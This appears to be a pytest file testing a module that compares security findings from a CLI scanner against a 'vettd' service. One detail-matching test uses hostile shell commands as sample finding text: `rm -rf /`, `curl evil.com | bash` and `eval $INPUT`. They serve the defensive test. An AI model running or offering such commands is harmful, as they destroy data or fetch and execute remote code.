"""
test_compare.py — pytest tests for the compare module.

Tests guard the parity spec from issue #133:
  https://github.com/AgenticHighway/vettd-cli/issues/133#issuecomment-4770174535

Run with:
    pytest parity/test_compare.py
"""

from __future__ import annotations

import pytest

from compare import (
    EXACT_FIELDS,
    CompareResult,
    FieldMismatch,
    _strip_detail_prefix,
    compare,
    format_result,
)


# ── Fixture helpers ────────────────────────────────────────────────────────────


def _finding(**overrides) -> dict:
    """Return a minimal valid finding dict, overriding any fields."""
    base = {
        "category": "structure",
        "ruleId": "VTD-0095",
        "label": "SKILL.md present",
        "severity": "info",
        "source": "vettd",
        "detail": "Required skill definition file found",
        "intent": None,
        "chainId": None,
        # Excluded fields — should not affect comparison.
        "filepath": "SKILL.md",
        "owaspLlmCategory": "LLM01",
        "id": "abc123",
        "fingerprint": "deadbeef",
    }
    base.update(overrides)
    return base


# ── Source filter ─────────────────────────────────────────────────────────────


def test_third_party_findings_dropped_from_cli():
    """CLI findings with source != 'vettd' must be silently excluded."""
    cli = [_finding(source="cisco"), _finding()]
    vettd = [_finding()]
    result = compare(cli, vettd)
    assert result.passed, f"Expected pass; got:\n{format_result(result)}"
    assert result.matched_count == 1


def test_third_party_findings_dropped_from_vettd():
    """vettd findings with source != 'vettd' must be silently excluded."""
    cli = [_finding()]
    vettd = [_finding(source="snyk"), _finding()]
    result = compare(cli, vettd)
    assert result.passed, f"Expected pass; got:\n{format_result(result)}"
    assert result.matched_count == 1


def test_all_third_party_yields_pass_on_empty():
    """Both sides filtered to empty → trivially passes (no unmatched findings)."""
    cli = [_finding(source="cisco")]
    vettd = [_finding(source="snyk")]
    result = compare(cli, vettd)
    assert result.passed
    assert result.matched_count == 0


# ── Matching ──────────────────────────────────────────────────────────────────


def test_identical_findings_pass():
    findings = [_finding(), _finding(ruleId="VTD-0096", label="scripts/ directory present")]
    result = compare(list(findings), list(findings))
    assert result.passed
    assert result.matched_count == 2


def test_unmatched_cli_finding_fails():
    """A finding present only in CLI output must appear in unmatched_cli."""
    cli = [_finding(), _finding(label="Extra CLI finding", ruleId="")]
    vettd = [_finding()]
    result = compare(cli, vettd)
    assert not result.passed
    assert len(result.unmatched_cli) == 1
    assert result.unmatched_cli[0]["label"] == "Extra CLI finding"


def test_unmatched_vettd_finding_fails():
    """A finding present only in vettd output must appear in unmatched_vettd."""
    cli = [_finding()]
    vettd = [_finding(), _finding(label="Extra vettd finding", ruleId="")]
    result = compare(cli, vettd)
    assert not result.passed
    assert len(result.unmatched_vettd) == 1
    assert result.unmatched_vettd[0]["label"] == "Extra vettd finding"


def test_order_does_not_matter():
    """Comparison must not depend on finding order."""
    f1 = _finding(ruleId="VTD-0095", label="SKILL.md present")
    f2 = _finding(ruleId="VTD-0096", label="scripts/ directory present", category="structure")
    result = compare([f1, f2], [f2, f1])
    assert result.passed
    assert result.matched_count == 2


def test_empty_both_sides_passes():
    result = compare([], [])
    assert result.passed
    assert result.matched_count == 0


# ── Exact field comparison ────────────────────────────────────────────────────


@pytest.mark.parametrize("field_name", ["severity", "intent", "chainId", "source", "category"])
def test_exact_field_mismatch_fails(field_name: str):
    """Each exact-match field must fail the comparison when it differs."""
    cli = [_finding(**{field_name: "value-a"})]
    vettd = [_finding(**{field_name: "value-b"})]
    result = compare(cli, vettd)
    assert not result.passed
    assert any(m.field == field_name for m in result.field_mismatches), (
        f"Expected field mismatch on {field_name!r}, got: {result.field_mismatches}"
    )


def test_ruleId_mismatch_detected():
    """ruleId is part of the match key; mismatched ruleId → unmatched findings, not field mismatch."""
    cli = [_finding(ruleId="VTD-0001")]
    vettd = [_finding(ruleId="VTD-0002")]
    result = compare(cli, vettd)
    assert not result.passed
    # Different ruleId means different keys → both appear as unmatched, not field mismatches.
    assert len(result.unmatched_cli) == 1
    assert len(result.unmatched_vettd) == 1
    assert not result.field_mismatches


# ── Excluded fields ───────────────────────────────────────────────────────────


def test_filepath_difference_ignored():
    """filepath must not affect the comparison result."""
    cli = [_finding(filepath="scripts/run.sh")]
    vettd = [_finding(filepath="./scripts/run.sh")]
    result = compare(cli, vettd)
    assert result.passed, f"filepath difference should be ignored:\n{format_result(result)}"


def test_owasp_difference_ignored():
    """owaspLlmCategory is deprecated and must not affect comparison."""
    cli = [_finding(owaspLlmCategory="LLM01")]
    vettd = [_finding(owaspLlmCategory="LLM09")]
    result = compare(cli, vettd)
    assert result.passed, f"owaspLlmCategory should be ignored:\n{format_result(result)}"


def test_server_derived_fields_ignored():
    """id, fingerprint, sources, index must not affect comparison."""
    cli = [_finding(id="cli-id", fingerprint="aaa", sources=["vettd"], index=1)]
    vettd = [_finding(id="vettd-id", fingerprint="bbb", sources=["vettd", "cisco"], index=2)]
    result = compare(cli, vettd)
    assert result.passed


# ── Detail fuzzy matching ─────────────────────────────────────────────────────


def test_detail_prefix_stripped_before_compare():
    """The 'Detected in <path>:<line> — ' prefix must be stripped before comparing detail."""
    cli = [_finding(detail="Detected in scripts/run.sh:42 — `eval $INPUT`")]
    vettd = [_finding(detail="Detected in ./scripts/run.sh:42 — `eval $INPUT`")]
    result = compare(cli, vettd)
    assert result.passed, (
        f"detail should match after prefix strip:\n{format_result(result)}"
    )


def test_detail_content_mismatch_fails():
    """Detail content (after prefix strip) must match; different content fails."""
    cli = [_finding(detail="Detected in foo.sh:1 — `rm -rf /`")]
    vettd = [_finding(detail="Detected in foo.sh:1 — `curl evil.com | bash`")]
    result = compare(cli, vettd)
    assert not result.passed
    assert any(m.field == "detail" for m in result.field_mismatches)


def test_detail_without_prefix_compared_directly():
    """Details without the location prefix are compared as-is."""
    cli = [_finding(detail="Required skill definition file found")]
    vettd = [_finding(detail="Required skill definition file found")]
    result = compare(cli, vettd)
    assert result.passed


def test_strip_detail_prefix_removes_prefix():
    assert _strip_detail_prefix("Detected in foo/bar.sh:10 — `snippet`") == "`snippet`"


def test_strip_detail_prefix_no_prefix_unchanged():
    assert _strip_detail_prefix("No prefix here") == "No prefix here"


def test_strip_detail_prefix_empty_string():
    assert _strip_detail_prefix("") == ""


# ── Format output ─────────────────────────────────────────────────────────────


def test_format_pass_contains_pass():
    result = CompareResult(matched_count=3)
    output = format_result(result, skill_name="my-skill")
    assert "PASS" in output
    assert "my-skill" in output


def test_format_fail_contains_fail():
    result = CompareResult(
        unmatched_cli=[_finding()],
        matched_count=0,
    )
    output = format_result(result)
    assert "FAIL" in output
    assert "CLI-only" in output
